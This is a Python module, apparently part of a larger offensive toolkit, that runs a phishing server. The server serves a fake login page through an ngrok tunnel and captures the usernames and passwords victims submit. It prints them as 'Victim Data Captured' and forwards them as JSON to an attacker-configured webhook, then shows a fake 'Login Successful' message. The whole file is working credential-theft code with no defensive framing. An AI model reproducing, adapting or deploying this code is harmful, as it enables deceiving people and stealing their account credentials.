from colorama import Fore, Style
import http.server
import socketserver
import threading
import time
import requests
import urllib.parse

class PhishingHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-type","text/html")
        self.end_headers()
        # Halaman login palsu sederhana
        html = """
        <html>
        <body>
            <h2>Login to Your Account</h2>
            <form method="POST" action="/">                <input type="text" name="username" placeholder="Username" required><br><br>
                <input type="password" name="password" placeholder="Password" required><br><br>
                <input type="submit" value="Login">            </form>
        </body>
        </html>
        """
        self.wfile.write(html.encode())

    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length).decode('utf-8')
        data = urllib.parse.parse_qs(post_data)
        username = data.get('username', [''])[0]
        password = data.get('password', [''])[0]

        print(f"{Fore.RED}[!] Victim Data Captured - Username: {username}, Password: {password}{Style.RESET_ALL}")
        
        # Kirim ke webhook
        webhook_url = self.server.config['webhook_url']
        try:
            requests.post(webhook_url, json={"username": username,"password": password})
            print(f"{Fore.GREEN}[+] Data Sent to Webhook Successfully!{Style.RESET_ALL}")
        except Exception as e:
            print(f"{Fore.RED}[!] Error Sending to Webhook: {e}{Style.RESET_ALL}")
        
        self.send_response(200)
        self.send_header("Content-type","text/html")
        self.end_headers()
        self.wfile.write(b"<html><body><h2>Login Successful! Redirecting...</h2></body></html>")

def start_phishing(config):
    print(f"{Fore.CYAN}=== Phishing Module ==={Style.RESET_ALL}")
    print(f"{Fore.YELLOW}Using Ngrok URL: {config['ngrok_url']}{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}Webhook URL for Credentials: {config['webhook_url']}{Style.RESET_ALL}")
    print(f"{Fore.GREEN}Starting Phishing Server...{Style.RESET_ALL}")
    
    PORT = 8000
    server = socketserver.ThreadingTCPServer(("", PORT), PhishingHandler)
    server.config = config
    
    def start_server():
        print(f"{Fore.MAGENTA}[*] Server started at localhost:{PORT}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[*] Waiting for Victim Connection...{Style.RESET_ALL}")
        server.serve_forever()

    server_thread = threading.Thread(target=start_server)
    server_thread.daemon = True
    server_thread.start()
    
    time.sleep(2)
    print(f"{Fore.YELLOW}[*] Open {config['ngrok_url']} in browser to test phishing page.{Style.RESET_ALL}")
    input(f"{Fore.GREEN}Press Enter to Stop Server and Return to Menu > {Style.RESET_ALL}")
    server.shutdown()
    server.server_close()
